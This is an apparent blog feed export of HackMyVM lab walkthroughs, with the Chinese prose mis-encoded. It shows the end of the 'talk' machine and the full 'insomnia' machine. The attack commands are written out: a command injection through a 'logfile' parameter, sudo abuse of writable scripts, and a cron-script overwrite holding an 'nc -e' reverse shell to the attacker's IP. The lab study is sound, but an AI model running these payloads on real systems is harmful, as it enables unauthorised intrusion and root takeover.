class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">3</span> <span class="keyword">valid</span> passwords <span class="built_in">found</span></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-19</span> <span class="number">12</span>:<span class="number">06</span>:<span class="number">19</span></span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>ç™»å½•nonaç”¨æˆ·ï¼Œæœ‰ä¸€ä¸ªsudoæƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">nona<span class="variable">@talk</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> nona on <span class="symbol">talk:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> nona may run the following commands on <span class="symbol">talk:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/lynx</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæœç´¢äº†ä¸€ä¸‹å‘ç°äº†æ˜¯ä¸ªç½‘é¡µæŸ¥çœ‹å™¨ï¼Œè€Œä¸”å¯ä»¥ç”¨fileåè®®è¯»å–æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">nona<span class="variable">@talk</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/bin/lynx <span class="symbol">file:</span>/<span class="regexp">//root</span><span class="regexp">/root.txt</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-insomnia</title>
    <url>/posts/50600.html</url>
    <content><![CDATA[<p>HMV-insomniaé¶æœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67b1d5e6d0e0a243d4ffda75.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">nmap</span> -A <span class="number">192.168</span>.<span class="number">112.252</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">02</span>-<span class="number">16</span> <span class="number">20</span>:<span class="number">12</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">112.252</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0014</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">8080</span>/tcp <span class="keyword">open</span>  http    PHP cli server <span class="number">5.5</span> <span class="built_in">or</span> <span class="keyword">later</span> (PHP <span class="number">7.3</span>.<span class="number">19</span>-<span class="number">1</span>)</span><br><span class="line">|_http-<span class="keyword">open</span>-proxy: Proxy might <span class="keyword">be</span> redirecting requests</span><br><span class="line">|_http-title: Chat</span><br><span class="line">MAC Address: D2:<span class="number">24</span>:EE:B5:C6:<span class="number">9</span>D (Unknown)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|router</span><br><span class="line">Running: Linux <span class="number">4</span>.<span class="keyword">X</span>|<span class="number">5</span>.<span class="keyword">X</span>, MikroTik RouterOS <span class="number">7</span>.<span class="keyword">X</span></span><br><span class="line">OS CPE: cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:4</span> cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:5</span> cpe:/<span class="keyword">o</span>:mikrotik:routero<span class="variable">s:7</span> cpe:/<span class="keyword">o</span>:linux:linux_kerne<span class="variable">l:5</span>.<span class="number">6.3</span></span><br><span class="line">OS details: Linux <span class="number">4.15</span> - <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> - <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.36</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.252</span>)</span><br><span class="line"></span><br><span class="line">OS <span class="built_in">and</span> Service detection performed. Please report any incorrect results at https://<span class="keyword">nmap</span>.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">8.19</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>åªå¼€æ”¾8080ç«¯å£æ˜¯ä¸€ä¸ªhttpæœåŠ¡ï¼Œå»webä¸Šé¢çœ‹çœ‹</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>ç»™äº†ä¸€ä¸ªè¾“å…¥æ¡†<br><img src="https://pic1.imgdb.cn/item/67b1d69ed0e0a243d4ffda8a.png"><br>ç„¶åç›®å½•æ‰«æä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.112.252:8080 -e php,jpg,html,js,txt,bak -i 200,300-399</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, jpg, html, js, txt, bak | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span></span><br><span class="line">Wordlist <span class="params">size:</span> <span class="number">11988</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.112.252_8080/_25-02-16_20-21-37.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">112.252</span>:<span class="number">8080</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">37</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">48</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">65</span>B  <span class="operator">-</span> <span class="symbol">/administration.php</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">53</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">2</span>KB <span class="operator">-</span> <span class="symbol">/chat.js</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">21</span>:<span class="number">53</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">3</span>B  <span class="operator">-</span> <span class="symbol">/chat.txt</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">22</span>:<span class="number">13</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">20</span>B  <span class="operator">-</span> <span class="symbol">/start.sh</span></span><br><span class="line"></span><br><span class="line">Task Completed</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080//administration.php</span></span></span><br><span class="line">You are <span class="keyword">not</span> allowed to <span class="built_in">view</span> : &lt;br&gt;Your activity has been logged</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080/start.sh</span></span></span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br><span class="line">                                                                           </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080/chat.txt   </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                      </span><br></pre></td></tr></table></figure></div>
<p>æ²¡æœ‰ä»€ä¹ˆå¤šä½™ä¿¡æ¯äº†ï¼Œç„¶åçš„æ€è·¯æ˜¯å¯¹è¿™ä¸ªadministration.phpè¿›è¡Œå‚æ•°çˆ†ç ´ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯ä¸ªphpæ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨åé—¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 192.168.112.252:8080//administration.php?FUZZ=id --hh 65</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.112.252:8080//administration.php?FUZZ=id</span><br><span class="line">Total requests: 4744</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload   </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000002522:   200        2 L      12 W       67 Ch       &quot;logfile&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°å‚æ•°<code>logfile</code>   å»ç½‘ç«™é‡Œé¢è¯•è¯•<br><img src="https://pic1.imgdb.cn/item/67b1daf2d0e0a243d4ffdc0f.png"><br>å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œç”¨pingæœ¬æœºï¼Œç„¶åç”¨tcpdumpçœ‹çœ‹éªŒè¯æ˜¯å¦å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="code"><pre><span class="line">?logfile=id<span class="comment">;ping -c2 192.168.112.11</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# tcpdump  -A -n icmp</span><br><span class="line">tcpdump: verbose output suppressed, <span class="keyword">use</span> -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length <span class="number">262144</span> bytes</span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">03.429775</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span>: ICMP echo request, id <span class="number">6058</span>, seq <span class="number">15</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..T</span>..@.@..<span class="number">9.</span>.p.<span class="built_in">..p</span>.........<span class="comment">;..g............................ !&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">03.429824</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span>: ICMP echo reply, id <span class="number">6058</span>, seq <span class="number">15</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..To</span>^..@...<span class="built_in">..p</span>.<span class="built_in">..p</span>.........<span class="comment">;..g............................ !&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">04.437600</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span>: ICMP echo request, id <span class="number">6058</span>, seq <span class="number">16</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..T</span>..@.@<span class="built_in">..b</span><span class="built_in">..p</span>.<span class="built_in">..p</span>.........&lt;<span class="built_in">..g</span>............................ !<span class="string">&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br></pre></td></tr></table></figure></div>
<p>åå¼¹shell<br><img src="https://pic1.imgdb.cn/item/67b1dc7fd0e0a243d4ffdc4c.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234          </span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)<span class="built_in"></span></span><br><span class="line"><span class="built_in">script </span>-qc /bin/bash /dev/<span class="literal">null</span></span><br><span class="line">www-data@insomnia:~/html$ ^Z</span><br><span class="line">zsh: suspended  nc -lp 1234</span><br><span class="line">                                                                           </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cat bbb                                  </span><br><span class="line">stty<span class="built_in"> raw </span>-echo; fg</span><br><span class="line">                                                                           </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# stty<span class="built_in"> raw </span>-echo; fg</span><br><span class="line">[1]  + continued  nc -lp 1234</span><br><span class="line">                             reset</span><br><span class="line">reset: unknown terminal<span class="built_in"> type </span>unknown</span><br><span class="line">Terminal type? xterm</span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@insomnia</span><span class="symbol">:~/html</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">insomnia:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">insomnia:</span></span><br><span class="line">    (julia) <span class="symbol">NOPASSWD:</span> /bin/bash /var/www/html/start.sh</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@insomnia</span><span class="symbol">:~/html</span><span class="variable">$ </span>cat /var/www/html/start.sh</span><br><span class="line">php -S <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">8080</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªstart.shç«Ÿç„¶æœ‰å†™å…¥æƒé™ï¼Œè¿™ä¸ªæ˜¯ä¸ªshè„šæœ¬ï¼Œé‚£æˆ‘ä»¬ç›´æ¥åœ¨è„šæœ¬é‡Œé¢å†™&#x2F;bin&#x2F;bash </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">www-data@insomnia:~/html$ ls -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>www-data www-data<span class="number"> 4096 </span>Feb<span class="number"> 16 </span>07:14 .</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root     root    <span class="number"> 4096 </span>Dec<span class="number"> 17 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data <span class="number"> 426 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>administration.php</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1610 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>chat.js</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 4096 </span>Feb<span class="number"> 16 </span>07:39 chat.txt</span><br><span class="line">drwxr-xr-x<span class="number"> 2 </span>www-data www-data<span class="number"> 4096 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>images</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 2899 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>index.php</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1684 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>process.php</span><br><span class="line">-rwxrwxrwx<span class="number"> 1 </span>root     root      <span class="number"> 20 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>start.sh</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1363 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>style.css</span><br><span class="line"></span><br><span class="line">www-data@insomnia:~/html$ echo &quot;/bin/bash&quot; &gt;&gt; /var/www/html/start.sh</span><br><span class="line"></span><br><span class="line">www-data@insomnia:~/html$ sudo -u julia /bin/bash /var/www/html/start.sh</span><br><span class="line">[Sun Feb<span class="number"> 16 </span>07:57:36 2025] Failed to listen on 0.0.0.0:8080 (reason: Address already in use)</span><br><span class="line">julia@insomnia:/var/www/html$ id</span><br><span class="line">uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br></pre></td></tr></table></figure></div>
<p> æˆåŠŸæ‹¿åˆ°ç”¨æˆ·çš„shell<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line"> julia<span class="variable">@insomnia</span>:<span class="regexp">/var/www</span><span class="regexp">/html$ find /</span> -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/de&lt;ml$ find /</span> -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev                        /null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/su</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br></pre></td></tr></table></figure></div><br>suidæ²¡ä¸œè¥¿ å†ä»æœ¬åœ°ä¸Šä¼ pspy64 çœ‹çœ‹æœ‰æ²¡æœ‰å®šæ—¶ä»»åŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">julia@insomnia:~$ wget <span class="number">192.168</span>.<span class="number">112.11</span><span class="symbol">/pspy64</span></span><br><span class="line"><span class="operator">-</span>-<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">4</span>0--  http:<span class="symbol">//192.168.112.11/pspy64</span></span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">112.11</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="params">Length:</span> <span class="number">3104768</span> (<span class="number">3.0</span>M) [application<span class="operator">/</span>octet-stream]</span><br><span class="line">Saving <span class="params">to:</span> â€˜pspy64â€™</span><br><span class="line"></span><br><span class="line">pspy64             <span class="number">100</span>%[<span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span><span class="operator">&gt;</span>]   <span class="number">2.96</span>M  <span class="operator">-</span>-.-KB<span class="symbol">/s</span>    <span class="keyword">in</span> <span class="number">0.09</span>s   </span><br><span class="line"></span><br><span class="line"><span class="number">202</span>5-<span class="number">0</span>2-<span class="number">16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">40</span> (<span class="number">34.1</span> MB<span class="operator">/</span>s) <span class="operator">-</span> â€˜pspy64â€™ saved [<span class="number">3104768</span><span class="operator">/</span><span class="number">3104768</span>]</span><br><span class="line"></span><br><span class="line">julia@insomnia:~$ chmod <span class="operator">=</span>x    ^C</span><br><span class="line">julia@insomnia:~$ chmoc ^C</span><br><span class="line">julia@insomnia:~$ chmod <span class="operator">+</span>x pspy64</span><br><span class="line">julia@insomnia:~$ <span class="symbol">./pspy64</span></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">58</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2</span>      | </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">58</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">1</span>      | <span class="symbol">/sbin/init</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">766</span>    | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">767</span>    | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">768</span>    | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c    <span class="symbol">/bin/bash</span> <span class="symbol">/var/cron/check.sh</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">769</span>    | <span class="symbol">/bin/bash</span> <span class="symbol">/var/cron/check.sh</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°rootçœŸçš„ä¼šæ‰§è¡Œä¸€ä¸ªå®šæ—¶ä»»åŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="code"><pre><span class="line">julia<span class="keyword">@insomnia</span>:~$ cat /var/cron/check.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">status=$(systemctl <span class="keyword">is</span>-active insomnia.service)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$status&quot;</span> == <span class="string">&quot;active&quot;</span>  ]; then</span><br><span class="line">   echo <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   systemctl start  insomnia.service</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªæ–‡ä»¶ä¹Ÿæœ‰æƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">julia@insomnia:/var/cron$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 13 </span>root root<span class="number"> 4096 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rwxrwxrwx <span class="number"> 1 </span>root root <span class="number"> 153 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>check.sh</span><br></pre></td></tr></table></figure></div>
<p>å’Œåˆšæ‰ç”¨æˆ·ä¸€æ ·çš„æ€è·¯ï¼Œç›´æ¥å†™åå¼¹shellè®©rootæ‰§è¡Œæ‹¿åˆ°rootçš„shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">julia<span class="variable">@insomnia</span><span class="symbol">:/var/cron</span><span class="variable">$ </span>echo <span class="string">&quot;nc -e 192.168.112.11 1234 /bin/bash&quot;</span> &gt; check.sh</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure></div>

